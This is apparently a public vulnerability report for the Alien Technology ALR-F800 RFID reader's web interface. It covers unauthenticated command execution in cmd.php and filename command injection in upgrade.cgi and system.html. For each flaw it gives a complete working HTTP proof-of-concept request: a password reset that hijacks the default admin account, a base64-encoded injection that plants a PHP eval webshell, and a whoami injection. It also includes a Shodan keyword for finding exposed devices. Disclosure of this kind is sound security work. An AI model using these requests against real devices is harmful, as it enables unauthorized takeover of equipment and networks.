# Information

**Affected product:** ALR-F800

**Vendor of the product:** Alien Technology

**Product page:** https://www.alientechnology.com/products/readers/alr-f800/

**Affected system version:** 19.10.24.00 and lower

**Firmware download:** https://www.alientechnology.com/download/alr-f800-software/?wpdmdl=7609&ind=MTU3NTQ4MjY2NndwZG1fYWxpZW4tZmlybXdhcmVfMTkuMTAuMjQuMDBfZjgwMC5hZWQ

**Shodan keyword:** http.title:"ALR-F800"

**Reported by:**  Wentao Yang (pushe4x@gmail.com)



# Description

ALR-F800 is a high-performance RFID reader and features Gatescape web interface.

Several vulnerabilities have been found in the `/cmd.php`、`/cgi-bin/upgrade.cgi`、`/admin/system.html`，allowing unauthorized attackers to modify web interface login credentials and execute arbitrary commands via a crafted request.



# Unauthorized Command Execution Vulnerabilities

The vulnerability exists in `/var/www/cmd.php`, where unauthorized attackers can execute arbitrary CLI commands, including modifying network configurations and login credentials.

![image-20240719165844844](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20240719165844844.png)

## POC:

Send the following request to the vulnerable server:

```http
POST /cmd.php HTTP/1.1
Host: VULNERABLE_SERVER_IP
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

cmd=password=password
```

After the attack, the default account (username `Alien`) for the web interface and SSH will have its password reset to `password`.



# Command injection vulnerability 1

This vulnerability exists in `/var/www/cgi-bin/upgrade.cgi`. This file takes the user-uploaded update package, appends the filename to the update command without any filtering, and then calls `popen` with the command string executed as an argument.

![image-20240719161359488](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20240719161359488.png)

After gaining system login access through the previous vulnerability, an attacker can execute system commands by crafting a malicious filename. 

Since the command execution does not echo back and cannot contain slashes, it is recommended to use the following POC to write a WebShell to the web page.

## POC:

Encode the command to be executed using Base64, for example:

`echo 'echo "<?php eval(\$_REQUEST['cmd']);?>" > /var/www/shell.php' | base64`

The encoded result is:

`ZWNobyAiPD9waHAgZXZhbChcJF9SRVFVRVNUWydjbWQnXSk7Pz4iID4gL3Zhci93d3cvc2hlbGwucGhw`

Finally, send the following request to the vulnerable server:

```http
POST /cgi-bin/upgrade.cgi HTTP/1.1
Host: VULNERABLE_SERVER_IP
Authorization: Basic YWxpZW46cGFzc3dvcmQ=
Content-Length: 301
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQ3keNKAe5AQ9G7bs

------WebKitFormBoundaryQ3keNKAe5AQ9G7bs
Content-Disposition: form-data; name="uploadedFile"; filename=";echo ZWNobyAiPD9waHAgZXZhbChcJF9SRVFVRVNUWydjbWQnXSk7Pz4iID4gL3Zhci93d3cvc2hlbGwucGhw| base64 -d | sh"
Content-Type: application/octet-stream

Hi！
------WebKitFormBoundaryQ3keNKAe5AQ9G7bs

```

After the attack, the WebShell will be written to：

`https://VULNERABLE_SERVER_IP//shell.php?cmd=phpinfo();`



# Command injection vulnerability 2

This vulnerability exists in `/admin/system.html`. By exploiting this vulnerability, attackers can execute system commands by uploading a file with a malicious filename. 

![image-20240730083747447](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20240730083747447.png)

## POC:

Send the following request to the vulnerable server:

```http
POST /admin/system.html HTTP/1.1
Host: VULNERABLE_SERVER_IP
Content-Length: 412
Cache-Control: max-age=0
Authorization: Digest username="alien", realm="Authorized users only", nonce="e01f9b86814aced6260f94fdfc978b21", uri="/admin/system.html", response="cbc415aecfcceb4a4afa23973960b8da", qop=auth, nc=000000cc, cnonce="dd03b48ea65cac94" #REPLACE THIS
Connection: keep-alive

------WebKitFormBoundaryJpks6wYXiOago8MS
Content-Disposition: form-data; name="upload_max_filesize"

3M
------WebKitFormBoundaryJpks6wYXiOago8MS
Content-Disposition: form-data; name="uploadedFile"; filename=";whoami"
Content-Type: application/octet-stream

123
------WebKitFormBoundaryJpks6wYXiOago8MS
Content-Disposition: form-data; name="action"

Install
------WebKitFormBoundaryJpks6wYXiOago8MS--
```

After the attack, the command `whoami` will be executed on the server.
